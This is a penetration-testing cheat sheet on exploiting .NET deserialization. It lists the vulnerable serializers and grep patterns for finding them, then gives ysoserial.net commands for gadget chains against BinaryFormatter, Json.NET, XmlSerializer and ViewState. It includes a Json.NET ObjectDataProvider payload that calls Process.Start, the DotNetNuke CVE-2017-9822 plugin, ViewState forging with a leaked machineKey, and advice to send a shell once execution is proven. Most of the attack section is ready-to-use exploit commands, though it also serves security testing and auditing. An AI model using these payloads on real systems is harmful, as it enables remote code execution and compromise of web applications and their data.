**.NET deserialization** — some .NET serializers write the type name into the data and, on the way back, build whatever type the data names. Mechanically: you find a place where the app deserializes something you control with one of those serializers, generate a "gadget chain" (objects from the framework itself whose constructors, setters or callbacks end in `Process.Start`) with ysoserial.net, and send it in place of the legitimate blob. The command runs as the app pool identity.

```
you -> app: cookie / __VIEWSTATE / JSON body = serialized gadget
app -> formatter.Deserialize(blob)
       builds ObjectDataProvider{ MethodName="Start", ObjectInstance=Process }
       ... property setters fire ... Process.Start("cmd /c ...")
```

Nothing in this note was executed locally: ysoserial.net and its gadgets need Windows and .NET Framework. Tool options are from the ysoserial.net README; payload shapes are its documented output.

## How it works

Whether a serializer is dangerous comes down to one question: **who decides the type?**

| Serializer | Type comes from | Dangerous when |
|---|---|---|
| `BinaryFormatter`, `SoapFormatter`, `NetDataContractSerializer` | the data | always |
| `LosFormatter`, `ObjectStateFormatter` (ViewState) | the data (BinaryFormatter inside) | no MAC, or you know the `machineKey` |
| `XmlSerializer`, `DataContractSerializer` | the `Type` passed to the constructor | that `Type` is built from input, e.g. `new XmlSerializer(Type.GetType(x))` |
| Json.NET (`JsonConvert`) | the `$type` field | `TypeNameHandling` is anything but `None` |
| `JavaScriptSerializer` | the `__type` field | constructed with a `SimpleTypeResolver` |
| `XamlReader.Parse` / `Load` | the XAML | you control the XAML |

A gadget is needed because you cannot ship code, only data. The classic one is `ObjectDataProvider` (WPF): setting its properties makes it call any method on any object.

## Discovery

White-box. Decompile the `bin/` DLLs (see [[whitebox_cheatsheet]]), export to a folder, grep:

```bash
grep -rnE 'BinaryFormatter|SoapFormatter|NetDataContractSerializer|LosFormatter|ObjectStateFormatter' .
grep -rnE 'TypeNameHandling|SimpleTypeResolver|XamlReader\.(Parse|Load)' .
grep -rnE 'new XmlSerializer\(|new DataContractSerializer\(' . | grep -vE 'typeof\('
grep -rnE '\.Deserialize\(|DeserializeObject|ReadObject\(' .
grep -rniE '<machineKey|enableViewStateMac|viewStateEncryptionMode' --include='*.config' .
```

For every hit trace the argument back: cookie, hidden field, header, request body, a database column you can write, a file you can upload.

Black-box, recognise the blob:

| You see | It is |
|---|---|
| base64 starting `AAEAAAD/////` | BinaryFormatter |
| base64 starting `/wE` | LosFormatter / ObjectStateFormatter (ViewState, sometimes other fields and cookies) |
| JSON containing `"$type"` | Json.NET with type names on |
| JSON containing `"__type"` | JavaScriptSerializer |
| XML with a `type="Namespace.Class, Assembly"` attribute on the root | XmlSerializer with the type taken from the data |
| `<SOAP-ENV:Envelope` | SoapFormatter |

ViewState: flip one character of `__VIEWSTATE` and resubmit. "Validation of viewstate MAC failed" means the MAC is on and you need the key. No complaint means it is off.

## Exploitation

### Method 1: ysoserial.net basics

```
ysoserial.exe -f <formatter> -g <gadget> -o <raw|base64|base64-urlencode> -c "<command>"
ysoserial.exe --fullhelp                      every gadget, formatter and plugin
ysoserial.exe --sf Json.Net                   which gadgets fit this formatter
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "ping -n 2 10.10.10.10" -t
```

`-t` fires the payload on your own machine first. Use it: a chain that fails locally will not work remotely.

| Gadget | Formatters it supports |
|---|---|
| `TypeConfuseDelegate` | BinaryFormatter, LosFormatter, NetDataContractSerializer |
| `TextFormattingRunProperties` | BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter, DataContractSerializer, Json.NET |
| `WindowsIdentity` | BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter, DataContractSerializer, Json.NET |
| `ObjectDataProvider` | Json.NET, XmlSerializer, DataContractSerializer, JavaScriptSerializer, Xaml, YamlDotNet < 5 |
| `DataSet`, `ClaimsIdentity`, `ClaimsPrincipal` | BinaryFormatter, LosFormatter, SoapFormatter |
| `PSObject` | BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter |

Prove execution with something you can observe (a ping or an HTTP request to your listener) before you send a shell. By default the command is wrapped in `cmd /c`; `--rawcmd` turns that off.

### Method 2: BinaryFormatter in a cookie or field

```
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "powershell -e <base64>"
```

Put the output where the app reads its blob. URL-encode it if it travels in a cookie or query string (`-o base64-urlencode`).

### Method 3: Json.NET with TypeNameHandling

```
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "ping -n 2 10.10.10.10"
```

Shape of the result:

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "$values": ["cmd", "/c ping -n 2 10.10.10.10"]
  },
  "ObjectInstance": {"$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}
}
```

It only fires where the target property or parameter is typed loosely enough (`object`, `dynamic`, an interface) for Json.NET to honour `$type`.

### Method 4: XmlSerializer with a type you control

The code looks like `new XmlSerializer(Type.GetType(typeFromInput)).Deserialize(xmlFromInput)`. `XmlSerializer` will not serialize `ObjectDataProvider` by itself because its members are typed `object`, so the payload wraps it in `ExpandedWrapper<T1, T2>`, which names both types up front.

```
ysoserial.exe -f XmlSerializer -g ObjectDataProvider -o raw -c "ping -n 2 10.10.10.10"
```

The output is XML whose root carries a `type` attribute with the expected type. Put the type where the app reads the type and the XML where it reads the data.

The public example is DotNetNuke before 9.1.1 (CVE-2017-9822): the `DNNPersonalization` cookie is deserialized this way on the 404 page. ysoserial.net has it as a plugin:

```
ysoserial.exe -p DotNetNuke -m run_command -c calc.exe
ysoserial.exe -p DotNetNuke -m read_file -f win.ini
```

### Method 5: ViewState with a known machineKey

If you can read `web.config` (LFI, backup file, source access), you can sign your own ViewState:

```xml
<machineKey validationKey="…" decryptionKey="…" validation="SHA1" decryption="AES" />
```

```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "ping -n 2 10.10.10.10" ^
  --path="/default.aspx" --apppath="/" ^
  --validationalg="SHA1" --validationkey="…" ^
  --decryptionalg="AES" --decryptionkey="…"
```

- `--generator=<__VIEWSTATEGENERATOR value>` replaces `--path` and `--apppath` when the page shows that hidden field.
- `--islegacy` for apps that do not use the 4.5 crypto mode; add `--isdebug` to see what it computes.
- POST the result as `__VIEWSTATE` to the same page. It works on any `.aspx`, with or without a real form.
- `AutoGenerate` in `validationKey` means the key is not in `web.config`. Try known-key lists (Blacklist3r, badsecrets) before giving up.

### Debug loop

Attach dnSpy to `w3wp.exe`, break on the `Deserialize` call, send the payload, and read the exception when it fails. The usual causes are a type the formatter refuses, a missing assembly (`PresentationFramework` is not loaded in every app), and a wrong path or key for ViewState. Setup is in [[whitebox_cheatsheet]].

## Caution

- **.NET Framework 4.x is the target.** That is what classic ASP.NET on IIS runs, and every gadget above works there. On modern .NET, `BinaryFormatter` is obsolete from .NET 5, throws by default in .NET 8 and is removed in .NET 9 (Microsoft documentation).
- **ViewState MAC cannot be switched off from ASP.NET 4.5.2.** On anything current you need the key, not a missing MAC.
- **`ObjectDataProvider` lives in WPF** (`PresentationFramework`). If the app never loads it, pick a gadget that does not need it.
- **`ActivitySurrogateSelector` needs a type-check bypass on 4.8 and later** (`-bgc ActivitySurrogateDisableTypeCheck` in ysoserial.net).
- **Commands run blind.** Output does not come back in the response; use a callback.

## References

- ysoserial.net - https://github.com/pwntester/ysoserial.net
- Friday the 13th JSON Attacks (Muñoz, Mirosh) - https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf
- Microsoft - BinaryFormatter security guide - https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide
- Blacklist3r - https://github.com/NotSoSecure/Blacklist3r
- badsecrets - https://github.com/blacklanternsecurity/badsecrets
